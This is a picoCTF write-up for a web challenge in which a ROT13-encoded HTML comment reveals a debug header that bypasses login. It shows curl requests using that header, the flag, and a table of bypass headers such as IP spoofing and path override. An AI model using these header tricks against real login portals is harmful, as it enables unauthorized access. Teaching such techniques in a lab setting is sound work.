# Crack the Gate 1 - picoCTF Writeup

**Challenge:** Crack the Gate 1  
**Category:** Web Exploitation  
**Difficulty:** Easy  
**Points:** (not specified)  
**Flag:** `picoCTF{brut4_f0rc4_3e21b3a3}`

---

## Description

We're in the middle of an investigation. One of our persons of interest, ctf player, is believed to be hiding sensitive data inside a restricted web portal. We've uncovered the email address he uses to log in: `ctf-player@picoctf.org`.

Unfortunately, we don't know the password, and the usual guessing techniques haven't worked. But something feels off... it's almost like the developer left a secret way in. Can you figure it out?

Additional details will be available after launching your challenge instance.

---

## Hints

1. Developers sometimes leave notes in the code; but not always in plain text.
2. A common trick is to rotate each letter by 13 positions in the alphabet.

---

## Approach

This is a web exploitation challenge that requires:
1. Launching a web instance
2. Inspecting the web application for developer notes
3. Finding hidden authentication bypass mechanisms
4. Using the discovered information to access the portal

The hints suggest looking at the source code and using ROT13 decoding.

---

## Solution

### Step 1: Launch the Challenge Instance

I clicked "Launch Instance" to start the web application. The instance URL was:
```
http://amiable-citadel.picoctf.net:57773
```

### Step 2: Inspect the Web Page

Opening the URL in a browser showed a simple login form with Email and Password fields.

### Step 3: View Page Source

I opened the browser's Developer Tools (F12) and examined the HTML source code. Looking at the Elements tab, I found a comment in the HTML:

```html
<!-- ABGR: Wnpx - grzcrbenel clctrs: hes urnqre "X-Qri-Npprff: lrf" -->
<!-- Remove before pushing to production! -->
```

### Step 4: Decode the ROT13 Comment

The comment appeared to be encoded with ROT13 (as hinted). I decoded it:

**Original:**
```
ABGR: Wnpx - grzcrbenel clctrs: hes urnqre "X-Qri-Npprff: lrf"
```

**ROT13 Decoded:**
```
NOTE: Jack - temporary bypass: use header "X-Dev-Access: yes"
```

This revealed a special HTTP header that bypasses authentication!

### Step 5: Identify the Login Endpoint

Looking at the form in the HTML source, I saw:
```html
<form id="loginForm"></form>
```

And in the JavaScript, there was likely a `/login` endpoint being used.

### Step 6: First Attempt - Wrong Endpoint

I tried sending a POST request to the root path:

```bash
curl -i -H "Content-Type: application/json" -H "X-Dev-Access: yes" \
-d '{"email":"ctf-player@picoctf.org","password":"randompassword"}' \
http://amiable-citadel.picoctf.net:57773/
```

**Response:**
```
HTTP/1.1 404 Not Found
Cannot POST /
```

This failed because I was using the wrong endpoint.

### Step 7: Correct Request to /login Endpoint

I modified the request to use the `/login` endpoint:

```bash
curl -i -H "Content-Type: application/json" -H "X-Dev-Access: yes" \
-d '{"email":"ctf-player@picoctf.org","password":"randompassword"}' \
http://amiable-citadel.picoctf.net:57773/login
```

**Response:**
```
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 127
ETag: W/"7f-EkThVkZAWb6dmqhDOA7/szUrN4A"
Date: Mon, 19 Jan 2026 08:04:37 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{"success":true,"email":"ctf-player@picoctf.org","firstName":"pico","lastName":"player","flag":"picoCTF{brut4_f0rc4_3e21b3a3}"}
```

Success! The flag was returned in the JSON response.

---

## Why This Works

1. **Developer Comments**: Developers often leave notes in HTML comments during development
2. **ROT13 Encoding**: The comment was obfuscated using ROT13 to hide sensitive information
3. **Debug Headers**: The `X-Dev-Access: yes` header was a development/debugging feature left in production
4. **Authentication Bypass**: The special header bypassed normal password authentication
5. **API Endpoint**: The login functionality used a REST API at `/login` endpoint

---

## ROT13 Cipher Reference

ROT13 is a simple letter substitution cipher that replaces each letter with the letter 13 positions after it in the alphabet:

| Original | A-M | N-Z |
|----------|-----|-----|
| ROT13 | N-Z | A-M |

**Example:**
- `HELLO` → `URYYB`
- `picoCTF` → `cvpbPGS`

**Decode ROT13 in Linux:**
```bash
echo "ABGR: Wnpx" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
# Output: NOTE: Jack
```

---

## Common HTTP Headers for Testing

| Header | Purpose | Example |
|--------|---------|---------|
| `X-Dev-Access` | Developer access bypass | `X-Dev-Access: yes` |
| `X-Debug` | Enable debug mode | `X-Debug: true` |
| `X-Forwarded-For` | IP address spoofing | `X-Forwarded-For: 127.0.0.1` |
| `X-Original-URL` | Path override | `X-Original-URL: /admin` |
| `Authorization` | Authentication token | `Authorization: Bearer token` |

---

## Flag

`picoCTF{brut4_f0rc4_3e21b3a3}`

---

## Tools Used

* Browser Developer Tools (F12) - Inspect HTML source code
* `curl` - Make HTTP requests from command line
* `tr` command - Decode ROT13 cipher
* Text editor - Manual ROT13 decoding (or online tool)

---

## Key Takeaways

* **Always check HTML source code** - Developer comments often contain valuable information
* **Look for encoded text** - ROT13, Base64, and other encodings are common in CTF challenges
* **Test different endpoints** - `/login`, `/api/login`, `/auth` are common authentication endpoints
* **Custom HTTP headers** - Debug/development headers like `X-Dev-Access` can bypass security
* **JSON API testing** - Use `curl` with proper headers to test REST APIs
* **Remove debug features in production** - This challenge shows why debug code should never reach production
* **ROT13 is easily reversible** - It provides no real security, only obfuscation

---

## Additional Commands

### Decode ROT13
```bash
# Using tr command
echo "ABGR: Wnpx" | tr 'A-Za-z' 'N-ZA-Mn-za-m'

# Using online tool
# Visit: https://rot13.com
```

### Test API with curl
```bash
# Basic POST request
curl -X POST -H "Content-Type: application/json" \
-d '{"key":"value"}' http://example.com/api

# With custom headers
curl -H "X-Custom-Header: value" http://example.com

# View response headers
curl -i http://example.com

# Follow redirects
curl -L http://example.com
```

### Extract JSON fields
```bash
# Using grep
curl http://example.com/api | grep -oP '"flag":"\K[^"]*'

# Using jq (JSON processor)
curl http://example.com/api | jq -r '.flag'
```
